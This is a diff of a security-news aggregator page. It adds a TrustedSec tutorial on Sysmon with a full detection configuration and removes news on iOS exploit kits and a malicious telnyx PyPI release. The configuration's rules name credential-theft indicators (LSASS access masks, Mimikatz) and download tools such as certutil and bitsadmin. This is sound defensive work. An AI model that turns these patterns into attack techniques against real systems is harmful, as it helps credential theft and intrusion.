+The development comes as a new version of iPhone exploit kit [DarkSword](https://thehackernews.com/2026/03/darksword-ios-exploit-kit-uses-6-flaws.html) has been leaked on GitHub, [raising concerns](https://cyberscoop.com/darksword-iphone-spyware-leak-ios-18-exploit-threat/) that it could equip more threat actors with advanced capabilities to compromise devices, effectively turning what was once an elite hacking tool into a mass exploitation framework. The release of the new version was first [reported](https://techcrunch.com/2026/03/23/someone-has-publicly-leaked-an-exploit-kit-that-can-hack-millions-of-iphones/) by TechCrunch.
+[Google News](https://news.google.com/publications/CAAqLQgKIidDQklTRndnTWFoTUtFWFJvWldoaFkydGxjbTVsZDNNdVkyOXRLQUFQAQ),</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
         </div>
         <div id="art-5" class="article-body">
-            <h2 style="color:#00FF00">>>> Apple Sends Lock Screen Alerts to Outdated iPhones Over Active Web-Based Exploits</h2>
-            <p style="color:#666">Source: <a href="https://thehackernews.com/2026/03/apple-sends-lock-screen-alerts-to.html" target="_blank" style="color:#666;">https://thehackernews.com/2026/03/apple-sends-lock-screen-alerts-to.html</a></p>
-            <div class="content-text">Apple is now sending Lock Screen notifications to iPhones and iPads running older versions of iOS and iPadOS to alert users of web-based attacks and urge them to install the update.
-The development was [first reported](https://www.macrumors.com/2026/03/27/critical-security-alerts-sent-to-ios-17-iphones/) by MacRumors.
-"Apple is aware of attacks targeting out-of-date iOS software, including the version on your iPhone. Install this critical update to protect your iPhone," the notification issued by Apple reads.
-The development comes a week after Apple [released](https://thehackernews.com/2026/03/apple-warns-older-iphones-vulnerable-to.html) a support document, asking users running older versions of iOS and iPadOS to update their devices following the discovery of new iOS exploit kits like [Coruna](https://thehackernews.com/2026/03/coruna-ios-exploit-kit-uses-23-exploits.html) and [DarkSword](https://thehackernews.com/2026/03/darksword-ios-exploit-kit-uses-6-flaws.html).
-Multiple threat actors of varied motivations have been found to leverage these kits over the past year to deliver malicious payloads when unsuspecting users visit a compromised website. While Coruna targets iOS versions between 13.0 and 17.2.1, DarkSword is designed to target iPhones running iOS versions between 18.4 and 18.7.
-A new report from Kaspersky this week [found](https://thehackernews.com/2026/03/coruna-ios-kit-reuses-2023.html) that the Coruna exploit kit is an evolution of the framework used in Operation Triangulation, a sophisticated campaign that targeted iPhones via zero-click iMessage exploits. It first came to light in June 2023.
-"Coruna is not a patchwork of public exploits; it is a continuously maintained evolution of the original Operation Triangulation framework," the Russian cybersecurity vendor said.
-It's currently not known how the two kits found their way into the hands of several threat actors and cybercriminals, but recent research has raised the possibility of an active market for second-hand zero-day exploits.
-The emergence of these kits, coupled with the leak of a newer version of DarkSword, has raised concerns that they could democratize access to exploits that were previously reserved for nation-states, potentially turning them into [mass-exploitation tools](https://techcrunch.com/2026/03/26/apple-made-strides-with-ios-26-security-but-leaked-hacking-tools-still-leave-millions-exposed-to-spyware-attacks/). In the process, they risk transforming iPhones and iPads into a bigger attack surface than they are at present.
-Users who are unable to update to a supported version are advised to consider enabling Lockdown Mode, if available, to protect against malicious web content. Lockdown Mode was introduced in 2022 and is available on devices running iOS versions 16 and later.
-In a statement shared with TechCrunch, Apple [said](https://techcrunch.com/2026/03/27/apple-says-no-one-using-lockdown-mode-has-been-hacked-with-spyware/), "We are not aware of any successful mercenary spyware attacks against a Lockdown Mode-enabled Apple device."
-[Google News](https://news.google.com/publications/CAAqLQgKIidDQklTRndnTWFoTUtFWFJvWldoaFkydGxjbTVsZDNNdVkyOXRLQUFQAQ),</div>
-            <button onclick="window.scrollTo(0,0)" style="margin-top:20px; color:#888; border:1px solid #444; padding:5px;">[↑ Back to Menu]</button>
-            <hr style="border:0; border-top:1px dashed #333; margin:40px 0;">
+            <h2 class="article-title">Building a Detection Foundation: Part 4 - Sysmon</h2>
+            <p class="source-link">Source: TrustedSec | <a href="https://trustedsec.com/blog/building-a-detection-foundation-part-4-sysmon" target="_blank">Original Link</a></p>
+            <div class="content-text">Building a Detection Foundation: Part 4 - Sysmon
+Table of contents
+Filling the Gaps Native Logging Can't
+At this point in our series, we have Windows Security events capturing logon sessions and process creation, and PowerShell logging capturing script execution. That's a solid foundation. But if you've worked Incident Response, you've hit the walls of native logging:
+- "We know PowerShell ran, but what did it connect to?"
+- "Something modified this registry key, but we don't know which process."
+- "A malicious DLL was loaded—when? By what?"
+This is where Sysmon enters the picture. Sysmon, a free Windows system service and driver from Microsoft [Sysinternals](https://learn.microsoft.com/en-us/sysinternals/) that monitors and logs system activity to the Windows event log, is soon to be included in the latest versions of Windows Server and Windows 11. It's not a replacement for native logging—it's a complement that provides telemetry Windows simply doesn't offer natively.
+I do have a small bias since I have been writing about the tool since it came out, given multiple training classes on it, and wrote most of the [Sysmon Community Guide](https://github.com/trustedsec/SysmonCommunityGuide), but I do see where it falls short and will do my best to cover some of the basics. Do check the [resources](#Resources) at the end of this blog to go deeper on how to leverage the tool.
+What Sysmon Provides
+Looking back at our [MITRE ATT&CK](https://attack.mitre.org/) data source coverage, here's where Sysmon fills critical gaps:
+Data Component | Technique Coverage | Sysmon Event |
+|---|---|---|
+Process Creation | 452 | Event 1 (enhanced parent info, hashes) |
+Network Connection Creation | 151 | Event 3 |
+Module Load | 109 | Event 7 |
+Windows Registry Key Modification | 86 | Events 12, 13, 14 |
+Process Access | 77 | Event 10 |
+File Creation | 174 | Event 11 |
+Driver Load | 14 | Event 6 |
+WMI Operations | 7 | Events 19, 20, 21 |
+Named Pipe | 4 | Events 17, 18 |
+DNS Queries | — | Event 22 |
+Let me walk through the Sysmon events you should care about and why.
+Essential Sysmon Events
+Event 1: Process Creation
+Yes, we have Event ID 4688 from native logging. So why use Sysmon Event 1?
+What Sysmon adds:
+- File hashes (MD5, SHA1, SHA256) of the executable
+- More reliable parent process information
+- Parent command line
+- Integrity level
+- More consistent formatting
+Detection value:
+- Hash lookups for known-bad binaries
+- Detecting renamed legitimate tools (hash matches, name doesn't)
+- Process tree reconstruction
+Event 3: Network Connection
+This is huge. Native Windows logging does not provide a reliable way to track which process connected to which IP address. Sysmon Event 3 captures:
+- Source IP address and port
+- Destination IP address and port
+- Protocol
+- The process that initiated the connection
+- User context
+Why this matters: You see PowerShell execute. It runs a download cradle. Event 3 shows you powershell.exe connected to 192.168.1.100:443. Now you have an IOC to hunt for across other systems and network logs.
+What to prioritize:
+When configuring Event 3, I recommend focusing on two categories:
+1. C2 Channels: Ports commonly used for C2 traffic
+- SSH (22) - Often used for encrypted C2
+- HTTP (80) and HTTPS (443) - The most common C2 channels
+- DNS (53) - DNS tunneling and C2 over DNS
+2. Lateral Movement/Remote Management: Ports that indicate system-to-system access
+- RDP (3389)
+- WinRM (5985, 5986)
+- SSH (22)
+- SMB (445)
+- Telnet (23)
+- Common Remote Monitoring and Management (RMM) tools (varies by vendor—ScreenConnect, AnyDesk, TeamViewer, etc.)
+The HTTPS exclusion problem:
+Here's a challenge: every software vendor wants telemetry these days. Your environment is full of legitimate HTTPS traffic from browsers, update services, security tools, and business applications. If you log all port 443 traffic, you'll drown in noise.
+The solution is compound exclusion rules. Don't exclude based on a single field—attackers can rename their tools. Instead, build exclusions that require multiple conditions to match:
+- Image (full path) AND ParentImage (full path)
+- Or Image AND User context
+For example, don't just exclude chrome.exe.
+Exclude C:\Program Files\Google\Chrome\Application\chrome.exe
+when the parent is C:\Program Files\Google\Chrome\Application\chrome.exe
+(Chrome spawns child processes). An attacker who names their beacon chrome.exe and drops it in C:\Users\Public\
+won't match your exclusion.
+This approach takes more effort upfront but dramatically reduces your exposure to simple evasion techniques.
+Event 6: Driver Load
+Attackers load malicious drivers for kernel-level access, rootkit functionality, or to disable security tools. Event 6 captures:
+- Driver path
+- Hash
+- Signature status
+Why this matters: Recall the vulnerable driver attacks used to blind EDR? Event 6 would show that driver loading, giving you a fighting chance to detect it.
+Event 7: Image Load (DLL)
+This logs when a module (DLL) is loaded into a process and is critical for detecting:
+- DLL hijacking
+- Side-loading attacks
+- Reflective DLL injection (in some cases)
+Configuration consideration: This event is noisy. You'll want to filter aggressively—focus on non-standard paths, unsigned DLLs, specific DLLs that are known to provide attackers capabilities they need, and specific high-risk processes.
+Event 10: Process Access
+This fires when a process opens a handle to another process. This is your primary indicator for credential extraction techniques that access LSASS.
+Why this matters: Mimikatz and similar tools need to open a handle to lsass.exe with specific access rights. Event 10 captures this.
+What to watch for:
+- Any process accessing LSASS with access mask
+0x1010
+(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION) - Pay special attention to access masks
+0x1F1FFF
+or0x1FFFFF
+as these are the highest permission level and mean the memory is being extracted for the process. - Non-standard processes accessing LSASS at all
+Event 11: File Create
+Look at log file creation events. Combined with the process context, you know not just that a file was created but what created it.
+Why this matters: Malware drops payloads. Event 11 shows powershell.exe created C:\Users\Public\payload.exe. You now have the full chain. By monitoring all executable file types and critical OS locations, you can detect:
+• Malware dropping executables in system directories (C:\Windows\System32, C:\Windows\SysWOW64)
+• Persistence mechanisms placing files in startup folders
+• Driver/kernel module installations in \Windows\System32\drivers\
+• DLL hijacking attempts in system directories
+• Scripts being staged in temp directories
+• Suspicious file creation in protected Windows folders
+• Executable files created in public/shared locations that shouldn't contain them
+The comprehensive file type coverage ensures you catch all executable formats Windows supports, not just .exe files. Monitoring critical OS paths catches attackers attempting to blend in with legitimate system files or establish deep persistence.
+For additional file creation rules and examples to consider for your environment, see the [Sysmon Modular project's File Create section here](https://github.com/olafhartong/sysmon-modular/tree/master/11_file_create).
+Events 12, 13, 14: Registry Operations
+- Event 12: Registry object added or deleted
+- Event 13: Registry value set
+- Event 14: Registry object renamed
+Why this matters: Registry persistence mechanisms (Run keys, services, COM hijacking) are everywhere in attacker tradecraft. Native Windows auditing can capture registry access, but it requires complex SACL configuration. Sysmon makes it straightforward.
+Events 17, 18: Pipe Created / Pipe Connected
+Why this matters: Certain pipe names are strong indicators of malicious activity, but here's the catch: attackers can (and do) randomize their pipe names. Targeting known-bad patterns will catch commodity tooling, but sophisticated actors will slip through.
+The better approach: Rather than trying to enumerate all possible malicious pipe names, I recommend building a baseline of valid named pipes in your environment and then creating exclusions for those. Log everything else. This way, any new or unusual pipe that appears gets captured—and you handle the alerting logic at your SIEM where you have more flexibility.
+We cover both strategies in depth in the [TrustedSec Sysmon Community Guide](https://github.com/trustedsec/SysmonCommunityGuide/blob/master/chapters/named-pipes.md)—the targeted approach and the exclusion-based approach. I personally prefer the exclusion method with detection happening at the SIEM layer.
+Events 19, 20, 21: WMI Events
+- Event 19: WmiEventFilter activity
+- Event 20: WmiEventConsumer activity
+- Event 21: WmiEventConsumerToFilter activity
+Why this matters: WMI event subscriptions are a stealthy persistence mechanism. These events let you see them being created. Paired with Microsoft-WMI-Activity/Operational Event ID 5858 that logs WMI errors, Event ID 5857 for providers loaded, and Event ID 5861 for permanent events, you have full redundancy in coverage.
+Event 22: DNS Query
+This logs DNS queries with the process that made them and is critical for detecting C2 communication, DNS tunneling, and domain generation algorithms.
+Why this matters: You see powershell.exe queried evil-domain.com. Your network logs might show the DNS traffic, but without Sysmon you wouldn't know which process initiated it.
+The better approach: I will be honest. This one in client machines is painful to get a good signal-to-noise ratio (SNR), and I prefer network management platforms. On servers where there is more control, less applications loading multiple websites, and new entries on a constant basis, it is of great value however. Use it if another solution is not available, but be aware on what role the host plays before implementing it.
+A Practical Sysmon Configuration
+Below is a production-ready Sysmon configuration that balances visibility with performance. This isn't a one-size-fits-all solution, aka you should tune it for your environment, but it's a strong starting point.
+This configuration can be copied to an XML document and applied using the Sysmon.exe process on a test system. Once tuned, you can deploy the registry value using GPO or Intune, depending on your environment. I would recommend the [Learning Sysmon video series](https://www.youtube.com/playlist?list=PLk-dPXV5k8SG26OTeiiF3EIEoK4ignai7) I recorded if you are not familiar on how to do this. I go over each event type and recommendations for each.
+<?xml version="1.0" encoding="UTF-8"?>
+<Sysmon schemaversion="4.90">
+<!--
+Sysmon Configuration for Detection Foundation
+Tune exclusions based on your environment's baseline noise
+-->
+<HashAlgorithms>md5,sha256,IMPHASH</HashAlgorithms>
+<DnsLookup>False</DnsLookup>
+<EventFiltering>
+<!-- Event 1: Process Creation - Log all, exclude known-noisy processes -->
+<RuleGroup name="ProcessCreate" groupRelation="or">
+<ProcessCreate onmatch="exclude">
+<!-- Tune these based on your environment -->
+<Image condition="is">C:\Windows\System32\backgroundTaskHost.exe</Image>
+<Image condition="is">C:\Windows\System32\RuntimeBroker.exe</Image>
+<Image condition="is">C:\Windows\System32\taskhostw.exe</Image>
+<ParentImage condition="is">C:\Windows\System32\svchost.exe</ParentImage>
+<!-- Add your environment-specific exclusions here -->
+</ProcessCreate>
+</RuleGroup>
+<!-- Event 3: Network Connection - Focus on C2 and lateral movement -->
+<!-- Priority: C2 channels (443, 80, 53, 22) and management ports (3389, 5985, 5986, 445, 23) -->
+<RuleGroup name="NetworkConnect" groupRelation="or">
+<NetworkConnect onmatch="include">
+<!-- C2 Channel Ports -->
+<DestinationPort condition="is">443</DestinationPort>
+<DestinationPort condition="is">80</DestinationPort>
+<DestinationPort condition="is">53</DestinationPort>
+<DestinationPort condition="is">22</DestinationPort>
+<!-- Lateral Movement / Remote Management Ports -->
+<DestinationPort condition="is">3389</DestinationPort> <!-- RDP -->
+<DestinationPort condition="is">5985</DestinationPort> <!-- WinRM HTTP -->
+<DestinationPort condition="is">5986</DestinationPort> <!-- WinRM HTTPS -->
+<DestinationPort condition="is">445</DestinationPort> <!-- SMB -->
+<DestinationPort condition="is">23</DestinationPort> <!-- Telnet -->
+<DestinationPort condition="is">135</DestinationPort> <!-- RPC -->
+<!-- Common RMM Tool Ports - adjust for tools in your environment -->
+<DestinationPort condition="is">8040</DestinationPort> <!-- ScreenConnect -->
+<DestinationPort condition="is">7070</DestinationPort> <!-- AnyDesk -->
+<DestinationPort condition="is">5938</DestinationPort> <!-- TeamViewer -->
+<!-- High-risk processes regardless of port -->
+<Image condition="end with">\powershell.exe</Image>
+<Image condition="end with">\cmd. exe</Image>
+<Image condition="end with">\wscript.exe</Image>
+<Image condition="end with">\cscript.exe</Image>
+<Image condition="end with">\mshta.exe</Image>
+<Image condition="end with">\rundll32.exe</Image>
+<Image condition="end with">\regsvr32.exe</Image>
+<Image condition="end with">\certutil.exe</Image>
+<Image condition="end with">\bitsadmin.exe</Image>
+</NetworkConnect>
+</RuleGroup>
+<!--
+HTTPS Exclusions - COMPOUND RULES ONLY
+CRITICAL: Use multiple fields (Image + ParentImage with FULL PATHS) to prevent bypass via renaming
+Single-field exclusions are trivially bypassed by attackers
+Example compound exclusion structure (implement based on your environment):
+<NetworkConnect onmatch="exclude">
+<Rule groupRelation="and">
+<Image condition="is">C:\Program Files\Google\Chrome\Application\chrome.exe</Image>
+<ParentImage condition="is">C:\Program Files\Google\Chrome\Application\chrome.exe</ParentImage>
+<DestinationPort condition="is">443</DestinationPort>
+</Rule>
+<Rule groupRelation="and">
+<Image condition="is">C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe</Image>
+<ParentImage condition="is">C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe</ParentImage>
+<DestinationPort condition="is">443</DestinationPort>
+</Rule>
+</NetworkConnect>
+Build your exclusion list by baselining legitimate HTTPS traffic in your environment.
+Always use full paths. Never exclude based on process name alone.
+-->
+<!-- Event 6: Driver Load - Log all, watch for unsigned -->
+<RuleGroup name="DriverLoad" groupRelation="or">
+<DriverLoad onmatch="include">
+<Signed condition="is">false</Signed>
+</DriverLoad>
+</RuleGroup>
+<!-- Event 7: Image Load (DLL) - Very noisy, focus on specific scenarios -->
+<RuleGroup name="ImageLoad" groupRelation="or">
+<ImageLoad onmatch="include">
+<!-- DLLs loaded from unusual paths -->
+<ImageLoaded condition="contains">\Users\</ImageLoaded>
+<ImageLoaded condition="contains">\Temp\</ImageLoaded>
+<ImageLoaded condition="contains">\AppData\</ImageLoaded>
+<ImageLoaded condition="contains">\Downloads\</ImageLoaded>
+<!-- Unsigned DLLs (adjust based on noise) -->
+<Signed condition="is">false</Signed>
+</ImageLoad>
+<ImageLoad onmatch="exclude">
+<Image condition="is">C:\Windows\System32\svchost.exe</Image>
+<Image condition="is">C:\Windows\explorer.exe</Image>
+</ImageLoad>
+</RuleGroup>
+<!-- Event 10: Process Access - Focus on LSASS -->
+<RuleGroup name="ProcessAccess" groupRelation="or">
+<ProcessAccess onmatch="include">
+<TargetImage condition="is">C:\Windows\System32\lsass.exe</TargetImage>
+</ProcessAccess>
+<ProcessAccess onmatch="exclude">
+<!-- Known legitimate LSASS accessors - tune for your environment -->
+<SourceImage condition="is">C:\Windows\System32\wbem\WmiPrvSE.exe</SourceImage>
+<SourceImage condition="is">C:\Windows\System32\svchost.exe</SourceImage>
+<SourceImage condition="is">C:\Windows\System32\lsass.exe</SourceImage>
+<SourceImage condition="contains">\Microsoft\Windows Defender\</SourceImage>
+</ProcessAccess>
+</RuleGroup>
+<!-- Event 11: File Create - Focus on executable and script types -->
+<!-- Event 11: File Create - Focus on executable types and critical OS locations -->
+<RuleGroup name="FileCreate" groupRelation="or">
+<FileCreate onmatch="include">
+<!-- All Windows executable file types -->
+<TargetFilename condition="end with">.exe</TargetFilename>
+<TargetFilename condition="end with">.dll</TargetFilename>
+<TargetFilename condition="end with">.sys</TargetFilename>
+<TargetFilename condition="end with">.drv</TargetFilename>
+<TargetFilename condition="end with">.ocx</TargetFilename>
+<TargetFilename condition="end with">.cpl</TargetFilename>
+<TargetFilename condition="end with">.scr</TargetFilename>
+<TargetFilename condition="end with">.com</TargetFilename>
+<TargetFilename condition="end with">.pif</TargetFilename>
+<!-- Script file types -->
+<TargetFilename condition="end with">.ps1</TargetFilename>
+<TargetFilename condition="end with">.psm1</TargetFilename>
+<TargetFilename condition="end with">.psd1</TargetFilename>
+<TargetFilename condition="end with">.bat</TargetFilename>
+<TargetFilename condition="end with">.cmd</TargetFilename>
+<TargetFilename condition="end with">.vbs</TargetFilename>
+<TargetFilename condition="end with">.vbe</TargetFilename>
+<TargetFilename condition="end with">.js</TargetFilename>
+<TargetFilename condition="end with">.jse</TargetFilename>
+<TargetFilename condition="end with">.wsf</TargetFilename>
+<TargetFilename condition="end with">.wsh</TargetFilename>
+<TargetFilename condition="end with">.hta</TargetFilename>
+<!-- Other potentially malicious file types -->
+<TargetFilename condition="end with">.msi</TargetFilename>
+<TargetFilename condition="end with">.msp</TargetFilename>
+<TargetFilename condition="end with">.lnk</TargetFilename>
+<TargetFilename condition="end with">.url</TargetFilename>
+<TargetFilename condition="end with">.inf</TargetFilename>
+<TargetFilename condition="end with">.reg</TargetFilename>
+<!-- Critical OS directories - Windows System directories -->
+<TargetFilename condition="begin with">C:\Windows\System32\</TargetFilename>
+<TargetFilename condition="begin with">C:\Windows\SysWOW64\</TargetFilename>
+<TargetFilename condition="begin with">C:\Windows\</TargetFilename>
+<!-- Boot and startup locations -->
+<TargetFilename condition="contains">\Windows\System32\drivers\</TargetFilename>
+<TargetFilename condition="contains">\Windows\System32\config\</TargetFilename>
+<!-- User profile critical locations -->
+<TargetFilename condition="contains">\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\</TargetFilename>
+<TargetFilename condition="contains">\AppData\Local\Temp\</TargetFilename>
+<!-- Public and shared locations -->
+<TargetFilename condition="contains">\Users\Public\</TargetFilename>
+<TargetFilename condition="contains">\ProgramData\</TargetFilename>
+<!-- Temp directories -->
+<TargetFilename condition="contains">\Temp\</TargetFilename>
+<TargetFilename condition="contains">\Windows\Temp\</TargetFilename>
+<!-- Common download and staging locations -->
+<TargetFilename condition="contains">\Downloads\</TargetFilename>
+<TargetFilename condition="contains">\Desktop\</TargetFilename>
+<!-- Recycle bin (sometimes used for staging) -->
+<TargetFilename condition="contains">\$Recycle.Bin\</TargetFilename>
+</FileCreate>
+</RuleGroup>
+<!-- Events 12, 13, 14: Registry - Focus on persistence locations -->
+<RuleGroup name="RegistryEvent" groupRelation="or">
+<RegistryEvent onmatch="include">
+<!-- Run keys -->
+<TargetObject condition="contains">\CurrentVersion\Run</TargetObject>
+<!-- Services -->
+<TargetObject condition="contains">\Services\</TargetObject>
+<!-- COM hijacking -->
+<TargetObject condition="contains">\Classes\CLSID\</TargetObject>
+<!-- Image File Execution Options -->
+<TargetObject condition="contains">\Image File Execution Options\</TargetObject>
+<!-- AppInit DLLs -->
+<TargetObject condition="contains">\Windows\AppInit_DLLs</TargetObject>
+<!-- Winlogon -->
+<TargetObject condition="contains">\Winlogon\</TargetObject>
+<!-- Security packages -->
+<TargetObject condition="contains">\Lsa\</TargetObject>
+</RegistryEvent>
+</RuleGroup>
+<!-- Events 17, 18: Named Pipes - Exclusion-based approach -->
+<!-- Build a baseline of valid pipes in YOUR environment and exclude those -->
+<!-- Alert on everything else at the SIEM layer -->
+<RuleGroup name="PipeEvent" groupRelation="or">
+<PipeEvent onmatch="exclude">
+<!--
+IMPORTANT: Baseline your environment's legitimate pipes and add them here.
+The goal is to log unusual/new pipes and alert at the SIEM.
+These are common Windows pipes - adjust for your environment.
+See: https://github.com/trustedsec/SysmonCommunityGuide/blob/master/chapters/named-pipes.md
+-->
+<PipeName condition="is">\lsass</PipeName>
+<PipeName condition="is">\ntsvcs</PipeName>
+<PipeName condition="is">\scerpc</PipeName>
+<PipeName condition="is">\wkssvc</PipeName>
+<PipeName condition="is">\srvsvc</PipeName>
+<PipeName condition="is">\winreg</PipeName>
+<PipeName condition="is">\spoolss</PipeName>
+<PipeName condition="is">\netlogon</PipeName>
+<PipeName condition="is">\samr</PipeName>
+<PipeName condition="is">\browser</PipeName>
+<!-- Add your environment-specific legitimate pipes below -->
+<!-- Example: Your EDR, management tools, LOB applications -->
+</PipeEvent>
+</RuleGroup>
+<!-- Events 19, 20, 21: WMI - Log all -->
+<RuleGroup name="WmiEvent" groupRelation="or">
+<WmiEvent onmatch="include">
+<Operation condition="is">Created</Operation>
+</WmiEvent>
+</RuleGroup>
+<!-- Event 22: DNS Query - Focus on interesting processes -->
+<RuleGroup name="DnsQuery" groupRelation="or">
+<DnsQuery onmatch="include">
+<Image condition="contains">powershell</Image>
+<Image condition="contains">cmd. exe</Image>
+<Image condition="contains">wscript</Image>
+<Image condition="contains">cscript</Image>
+<Image condition="contains">rundll32</Image>
+<Image condition="contains">regsvr32</Image>
+</DnsQuery>
+<DnsQuery onmatch="exclude">
+<QueryName condition="end with">.microsoft.com</QueryName>
+<QueryName condition="end with">.windows.com</QueryName>
+<QueryName condition="end with">.windowsupdate.com</QueryName>
+</DnsQuery>
+</RuleGroup>
+</EventFiltering>
+</Sysmon>
+Deploying Sysmon
+Installation
+Download Sysmon from the official [Sysinternals page](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon).
+Install with configuration:
+I recommend you copy the configuration shown above into an XML document and apply it.
+sysmon64.exe -accepteula -i sysmon-config.xml
+Update existing configuration:
+After tunning the configuration to your liking, you can apply the tuned config to a system using scripts, GPO, or Intune. The command below will apply the updated config.
+sysmon64.exe -c sysmon-config.xml
+Check current configuration:
+sysmon64.exe -c
+Log Location
+Sysmon events appear in:
+Applications and Services Logs → Microsoft → Windows → Sysmon → Operational
+Log Size Configuration
+Default log size is typically too small. Increase it:
+wevtutil sl "Microsoft-Windows-Sysmon/Operational" /ms:524288000
+Or via GPO:
+Computer Configuration
+→ Administrative Templates
+→ Windows Components
+→ Event Log Service
+→ Sysmon
+→ Specify maximum log file size: 512000 KB
+Configuration Tuning Philosophy
+The configuration I provided is a starting point. I took the effort to ensure that the config would serve as a starting point for workstation and server alike. As you tune the config, ensure that you tune one for workstation and one for server. Once this is done, depending on the roles for servers and who uses the workstations, you can tune even further. Start slow and test. You need to tune it for your environment. Here's my approach:
+- Start noisy, filter down: Enable more than you need initially. See what generates volume. Add exclusions for verified benign activity.
+- Threat model drives filtering: What attacks are you most concerned about? Adjust your filters accordingly. If you're worried about insider threats, you might want more coverage. If you're focused on commodity malware, you can be more aggressive with exclusions.
+- Baseline before excluding: This is especially important for named pipes but applies broadly. Understand what's normal in your environment before you start filtering. Otherwise, you risk excluding something an attacker is abusing.
+- Test before deploying: Deploy to a test group first. Measure log volume and system impact. Adjust before rolling out widely.
+- Iterate continuously: Your environment changes. So do attacker techniques. Review and update your configuration quarterly, at minimum.
+- Use community resources: The
+[TrustedSec Sysmon Community Guide](https://github.com/trustedsec/SysmonCommunityGuide)goes deep on each event type with practical configuration guidance. We cover strategies for named pipes, network connections, registry monitoring, and more. It's worth reading through before finalizing your configuration.
+If you prefer video content, we also have a [Sysmon YouTube series](https://www.youtube.com/playlist?list=PLk-dPXV5k8SG26OTeiiF3EIEoK4ignai7) that walks through configuration concepts and practical deployment scenarios.
+Sysmon Alternatives and Companions
+I want to be transparent—Sysmon isn't the only option. Some alternatives:
+- Velociraptor – Open-source DFIR tool with endpoint visibility
+- osquery – SQL-based endpoint telemetry
+- EDR-native capabilities – Many EDRs provide similar telemetry (but that's our single-source problem)
+The advantage of Sysmon is that it's free, it's from Microsoft (so no third-party driver concerns), and the logs go to the standard Windows Event Log infrastructure.
+What We've Built So Far
+Across Parts 1-4 of this blog series, we've established:
+[Part 2 - Windows Security Events:](https://trustedsec.com/blog/building-a-detection-foundation-part-2-windows-security-events)
+- Logon/Logoff for session tracking
+- Process Creation (4688) with command lines
+- Service installation
+- Scheduled tasks
+- Script Block Logging (4104) for deobfuscated scripts
+- Module Logging (4103) for command execution
+- Transcription for full session recording
+Part 4 - Sysmon:
+- Enhanced process creation with hashes
+- Network connections by process
+- Registry modifications
+- File creation
+- Driver and DLL loading
+- Named pipe activity
+- WMI events
+- DNS queries
+In Part 5, we'll bring it all together—correlating across these sources during investigations and building detections that leverage the full foundation.
+Resources for Going Deeper
+[TrustedSec Sysmon Community Guide](https://github.com/trustedsec/SysmonCommunityGuide)– Comprehensive documentation on each Sysmon event type with configuration strategies and examples[Sysmon Video Series](https://www.youtube.com/playlist?list=PLk-dPXV5k8SG26OTeiiF3EIEoK4ignai7)– Video walkthroughs covering deployment, configuration, and practical use cases[Microsoft Sysmon Documentation](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon)– Official documentation and download</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
         </div>
         <div id="art-6" class="article-body">
-            <h2 style="color:#00FF00">>>> TeamPCP Pushes Malicious Telnyx Versions to PyPI, Hides Stealer in WAV Files</h2>
-            <p style="color:#666">Source: <a href="https://thehackernews.com/2026/03/teampcp-pushes-malicious-telnyx.html" target="_blank" style="color:#666;">https://thehackernews.com/2026/03/teampcp-pushes-malicious-telnyx.html</a></p>
-            <div class="content-text">TeamPCP, the threat actor behind the supply chain attack targeting [Trivy](https://thehackernews.com/2026/03/trivy-security-scanner-github-actions.html), [KICS](https://thehackernews.com/2026/03/teampcp-hacks-checkmarx-github-actions.html), and [litellm](https://thehackernews.com/2026/03/teampcp-backdoors-litellm-versions.html), has now compromised the [telnyx](https://pypi.org/project/telnyx/) Python package by pushing two malicious versions to steal sensitive data.
-The two versions, 4.87.1 and 4.87.2, published to the Python Package Index (PyPI) repository on March 27, 2026, concealed their credential harvesting capabilities within a .WAV file. Users are recommended to downgrade to version 4.87.0 immediately. The PyPI project is currently quarantined.
-Various reports from [Aikido](https://www.aikido.dev/blog/telnyx-pypi-compromised-teampcp-canisterworm), [Endor Labs](https://www.endorlabs.com/learn/teampcp-strikes-again-telnyx-compromised-three-days-after-litellm), [JFrog](https://research.jfrog.com/post/team-pcp-strikes-again-telnyx-popular-library-hit/), [Ossprey Security](https://ossprey.com/blog/telnyx-pypi-malware-wav/), [SafeDep](https://safedep.io/malicious-telnyx-pypi-compromise/), [Socket](https://socket.dev/blog/telnyx-python-sdk-compromised), and [StepSecurity](https://www.stepsecurity.io/blog/teampcp-plants-wav-steganography-credential-stealer-in-telnyx-pypi-package) indicate the malicious code is [injected](https://github.com/team-telnyx/telnyx-python/issues/235) into "telnyx/_client.py," causing it to be invoked when the package is imported into a Python application. The malware is designed to target Windows, Linux, and macOS systems.
-"Our analysis reveals a three-stage runtime attack chain on Linux/macOS consisting of delivery via audio steganography, in-memory execution of a data harvester, and encrypted exfiltration," Socket said. "The entire chain is designed to operate within a self-destructing temporary directory and leave near-zero forensic artifacts on the host."
-On Windows, the malware downloads a file named "hangup.wav" from a command-and-control (C2) server and extracts from the audio data an executable that's then dropped into the Startup folder as "msbuild.exe." This allows it to persist across system reboots and automatically run every time a user logs in to the system.
-In case the compromised host runs on Linux or macOS, it fetches a different .WAV file ("ringtone.wav") from the same server to extract a third-stage collector script and run. The credential harvester is designed to capture a wide range of sensitive data and exfiltrate the data in the form of "tpcp.tar.gz" via an HTTP POST request to "83.142.209[.]203:8080."
-"The standout technique in this sample - and the reason for the post title - is the use of audio steganography to deliver the final payload," Ossprey Security said. "Rather than hosting a raw executable or a base64 blob on the C2 (both of which are trivially flagged by network inspection and EDR), the attacker wraps the payload inside a .WAV file."
-"This is almost identical to the sample observed in the LiteLLM malware, with one key difference: instead of embedding the malicious code as Base64, they now download it from a remote server," OX Security's Moshe Siman Tov Bustan [said](https://www.ox.security/blog/telnyx-malware-teampcp-strikes-again-following-litellm-compromise/). "The malware downloads an XOR-obfuscated WAV file from a remote C2 server, decodes it, and then executes it on the target machine."
-It's worth noting that the .WAV trick isn't new to TeamPCP. The same methodology was [previously used](https://ramimac.me/teampcp/#kamikaze-v33) to conceal the malicious payload in the "[kamikaze](https://thehackernews.com/2026/03/trivy-hack-spreads-infostealer-via.html)" wiper malware distributed via CanisterWorm and exposed Docker instances. In addition, the malware features a Kubernetes lateral movement component that abuses Kubernetes service account tokens to deploy a privileged pod to every node and deploy a persistence mechanism.
